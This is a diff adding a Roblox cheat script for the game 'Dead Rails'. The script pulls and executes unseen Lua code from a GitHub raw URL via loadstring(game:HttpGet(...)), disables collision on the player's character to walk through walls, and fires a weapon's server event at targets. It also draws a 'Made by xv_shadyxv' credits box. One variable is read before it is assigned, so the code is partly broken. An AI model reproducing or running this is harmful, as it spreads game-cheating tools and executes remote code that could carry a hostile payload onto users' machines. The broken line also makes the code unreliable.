@@ -1,0 +1,37 @@
+-- 🎖️ Credits to: xv_shadyxv
+print("Credits to: xv_shadyxv")
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Marco8642/science/refs/heads/ok/dead%20rails"))()
+task.wait(1)
+
+local p, c = game.Players.LocalPlayer, p.Character or p.CharacterAdded:Wait()
+local r, h, g = c:FindFirstChild("HumanoidRootPart"), c:FindFirstChild("Humanoid"), c:FindFirstChild("Revolver") or p.Backpack:FindFirstChild("Revolver")
+
+game:GetService("RunService").Stepped:Connect(function()
+    for _, v in pairs(c:GetDescendants()) do if v:IsA("BasePart") then v.CanCollide = false end end
+end)
+
+local function shoot(b) if g and b:FindFirstChild("HumanoidRootPart") then 
+    local e = g:FindFirstChild("FireEvent") or game.ReplicatedStorage:FindFirstChild("FireEvent")
+    if e then e:FireServer(b.HumanoidRootPart.Position + Vector3.new(0, 1.5, 0)) end 
+end end
+
+-- 🟦 UI: Movable Credits Box (Top Left)
+local screenGui = Instance.new("ScreenGui", game.Players.LocalPlayer:WaitForChild("PlayerGui"))
+local creditFrame = Instance.new("Frame", screenGui)
+local creditLabel = Instance.new("TextLabel", creditFrame)
+
+creditFrame.Size = UDim2.new(0, 200, 0, 30)
+creditFrame.Position = UDim2.new(0, 10, 0, 10) -- Top-left corner
+creditFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+creditFrame.BorderSizePixel = 2
+creditFrame.BorderColor3 = Color3.fromRGB(255, 85, 85)
+creditFrame.Active = true
+creditFrame.Draggable = true -- Makes it movable
+
+creditLabel.Size = UDim2.new(1, 0, 1, 0)
+creditLabel.BackgroundTransparency = 1
+creditLabel.Text = "Made by xv_shadyxv"
+creditLabel.TextColor3 = Color3.fromRGB(255, 85, 85)
+creditLabel.Font = Enum.Font.GothamBold
+creditLabel.TextSize = 16
